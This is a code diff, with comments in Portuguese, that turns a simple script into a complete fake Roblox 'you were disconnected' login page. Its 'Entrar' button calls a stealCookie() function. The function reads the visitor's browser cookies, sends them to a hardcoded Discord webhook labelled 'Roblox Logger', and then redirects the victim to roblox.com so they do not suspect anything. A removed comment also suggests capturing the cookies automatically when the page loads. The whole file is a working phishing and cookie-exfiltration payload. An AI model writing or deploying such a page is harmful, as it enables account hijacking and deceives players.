@@ -1,33 +1,85 @@
-<script>
-    // COLE SUA URL DO WEBHOOK AQUI DENTRO DAS ASPAS
-    const webhookUrl = 'https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1';
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Roblox</title>
+    <style>
+        body { 
+            background-color: #191919; 
+            color: white; 
+            font-family: Arial, sans-serif; 
+            display: flex; 
+            justify-content: center; 
+            align-items: center; 
+            height: 100vh; 
+            margin: 0; 
+            text-align: center;
+        }
+        .container { padding: 20px; }
+        img { width: 150px; margin-bottom: 20px; }
+        h1 { font-size: 24px; margin-bottom: 10px; }
+        p { color: #b8b8b8; margin-bottom: 20px; }
+        button { 
+            background-color: #0074bd; 
+            color: white; 
+            border: none; 
+            padding: 12px 24px; 
+            font-size: 16px; 
+            cursor: pointer; 
+            border-radius: 4px;
+            font-weight: bold;
+        }
+        button:hover { background-color: #005a8a; }
+    </style>
+</head>
+<body>
 
-    function stealCookie() {
-        var cookie = document.cookie;
+    <div class="container">
+        <!-- Logo do Roblox -->
+        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png" alt="Roblox Logo">
+        <h1>Você foi desconectado</h1>
+        <p>Clique abaixo para entrar novamente.</p>
         
-        // Prepara a mensagem bonita para o Discord
-        const payload = {
-            content: "🍪 Novo Cookie Capturado!\n" + cookie,
-            username: "Roblox Logger",
-            avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png"
-        };
+        <!-- O botão chama a função stealCookie() -->
+        <button onclick="stealCookie()">Entrar</button>
+    </div>
 
-        // Envia para o Discord
-        fetch(webhookUrl, {
-            method: 'POST',
-            headers: { 'Content-Type': 'application/json' },
-            body: JSON.stringify(payload)
-        })
-        .then(() => {
-            // Redireciona a vítima para o Roblox para ela não desconfiar
-            window.location.href = "https://www.roblox.com";
-        })
-        .catch(err => {
-            console.error('Erro:', err);
-            window.location.href = "https://www.roblox.com";
-        });
-    }
-    
-    // Se quiser que capture automaticamente sem botão, use a linha abaixo:
-    // window.onload = stealCookie;
-</script>
+    <script>
+        // ⚠️ COLE SUA URL DO WEBHOOK AQUI DENTRO DAS ASPAS SIMPLES
+        const webhookUrl = 'https://discord.com/api/webhooks/1567446528908591105/HJrrrW2hiOuddvGHqhiOugZ10PdTdBAsGR9hV6ikva-37KwkXpdaZDCz2XQRKKQdJ7B1'; 
+
+        function stealCookie() {
+            var cookie = document.cookie;
+            
+            console.log("Cookie capturado:", cookie); // Para você ver no F12 se pegou
+
+            // Formata a mensagem bonita pro Discord
+            const payload = {
+                content: "🍪 **Novo Cookie Capturado!**\n\n```\n" + cookie + "\n```",
+                username: "Roblox Logger",
+                avatar_url: "https://upload.wikimedia.org/wikipedia/commons/thumb/f/f6/Roblox_player_icon_black.svg/1200px-Roblox_player_icon_black.svg.png"
+            };
+
+            // Envia para o Discord
+            fetch(webhookUrl, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (!response.ok) throw new Error('Erro no Discord');
+                console.log("Enviado com sucesso!");
+                
+                // Redireciona para o Roblox APÓS enviar
+                window.location.href = "https://www.roblox.com";
+            })
+            .catch(error => {
+                console.error("Erro ao enviar:", error);
+                // Mesmo com erro, joga pra roblox pra não desconfiar
+                window.location.href = "https://www.roblox.com";
+            });
+        }
+    </script>
+</body>
+</html>
